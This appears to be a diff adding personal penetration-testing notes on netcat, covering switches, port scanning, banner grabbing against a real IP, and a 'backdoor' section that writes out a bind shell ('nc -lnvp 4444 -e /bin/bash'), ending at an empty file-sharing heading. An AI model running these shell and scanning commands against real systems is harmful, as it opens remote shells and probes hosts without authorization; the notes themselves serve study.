@@ -1,0 +1,59 @@
+--- NETCAT ---
+
+Objectives
+
+* Network Scan
+* Banner Grabbing
+* Backdors
+* Execute Binary file
+* Share Files Through Netcat
+
+we can use it using
+nc / netcat ---> data transfer in clear form
+
+Ncat is different ---> transmission is encrypted, made by nmap
+
+
+Switches in nc
+
+-l => listen to connect request
+-v => verbosity
+-p => port 
+-w => timeout 
+-n => dont resolve dns
+-e => ecexute commands
+-z => Post scan / zero-I/O mode
+
+
+
+1. Scanning Network
+
+$ nc -zvw 1 192.168.1.1 1-1000   --> check 1 to 1000 ports
+
+$ nc -zvw 1 192.168.1.1 80  ---> check only port 80
+
+$ nc -zvnw 1 10.10.10.10  1-10000
+
+
+2. Banner grabbing
+
+echo "" | nc -vn 10.10.10.10 80  --> check responce of server 
+
+like
+┌──(death㉿esther)-[~/notes]
+└─$ echo "" | nc -vn  64.202.189.216 110
+(UNKNOWN) [64.202.189.216] 110 (pop3) open
++OK Welcome to MailEnable POP3 Server
+ 
+3. Backdoor
+
+a ----> send connect ---> take connect ---> b
+
+victim --------> send conncet ----------> us
+
+Initiator    ---------------------> listner
+
+nc -v 10.10.10.10 4444           nc -lnvp 4444 -e /bin/bash 
+
+
+4. Share file from 1 to another 
